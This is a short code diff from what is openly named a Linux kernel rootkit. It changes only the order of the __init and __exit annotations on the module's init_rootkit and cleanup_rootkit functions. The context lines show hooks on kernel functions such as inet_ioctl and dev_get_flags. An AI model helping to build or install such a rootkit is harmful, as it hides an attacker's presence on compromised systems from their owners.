@@ -978,7 +978,7 @@ static int new_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long a
 // extern void parport_pc_exit(void);
 
 
-__init int init_rootkit(void)
+int __init init_rootkit(void)
 {
     DEBUG("begin the init function\n");
 
@@ -1021,7 +1021,7 @@ __init int init_rootkit(void)
     return 0;
 }
 
-__exit void cleanup_rootkit(void)
+void __exit cleanup_rootkit(void)
 {
     hook_stop(inet_ioctl);
     hook_stop(dev_get_flags);
